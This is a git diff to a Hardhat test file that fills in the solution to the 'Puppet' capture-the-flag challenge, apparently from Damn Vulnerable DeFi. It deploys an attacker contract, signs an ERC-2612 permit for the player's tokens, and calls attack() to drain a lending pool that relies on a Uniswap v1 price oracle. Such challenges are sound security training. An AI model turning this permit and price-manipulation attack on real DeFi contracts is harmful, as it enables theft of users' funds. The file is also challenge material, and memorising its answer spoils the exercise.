@@ -4,6 +4,8 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { splitSignature } = require("ethers/lib/utils");
+const { constants } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -85,8 +87,8 @@ describe('[Challenge] Puppet', function () {
 
         // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
         expect(
-            await lendingPool.calculateDepositRequired(10n ** 18n)
-        ).to.be.eq(2n * 10n ** 18n);
+            await lendingPool.calculateDepositRequired(10n ** 18n) // 1
+        ).to.be.eq(2n * 10n ** 18n); // 2
 
         expect(
             await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
@@ -94,7 +96,32 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+        const attacker = await (await ethers.getContractFactory('PuppetAttacker')).deploy(
+            uniswapExchange.address,
+            token.address,
+            lendingPool.address
+        );
+
+        const signature = await getPermitSignature({ 
+            wallet: player,
+            token: token,
+            spender: attacker.address,
+            value: PLAYER_INITIAL_TOKEN_BALANCE
+        });
+
+        await attacker.connect(player).attack({
+            owner: player.address,
+            spender: attacker.address,
+            value: PLAYER_INITIAL_TOKEN_BALANCE,
+            deadline: constants.MaxUint256,
+            r: signature.r,
+            s: signature.s,
+            v: signature.v
+        },
+        {
+            value: PLAYER_INITIAL_ETH_BALANCE - (10n ** 18n)
+        });
     });
 
     after(async function () {
@@ -111,4 +138,56 @@ describe('[Challenge] Puppet', function () {
             await token.balanceOf(player.address)
         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
     });
+
+    async function getPermitSignature({
+        wallet,
+        token,
+        spender,
+        value
+    }) {
+        const nonce = await token.nonces(wallet.address);
+        const name = await token.name();
+        const version = '1';
+        const chainId = await wallet.getChainId();
+        const deadline = constants.MaxUint256;
+
+
+        return splitSignature(await wallet._signTypedData({
+            name,
+            version,
+            chainId,
+            verifyingContract: token.address,
+        }, {
+            Permit: [
+                {
+                    name: 'owner',
+                    type: 'address',
+                }, 
+                {
+                    name: 'spender',
+                    type: 'address'
+                },
+                {
+                    name: 'value',
+                    type: 'uint256'
+                },
+                {
+                    name: 'nonce',
+                    type: 'uint256'
+                },
+                {
+                    name: 'deadline',
+                    type: 'uint256'
+                }
+            ],
+        },
+        {
+            owner: wallet.address,
+            spender,
+            value,
+            nonce,
+            deadline
+        }
+        ));
+    }
 });
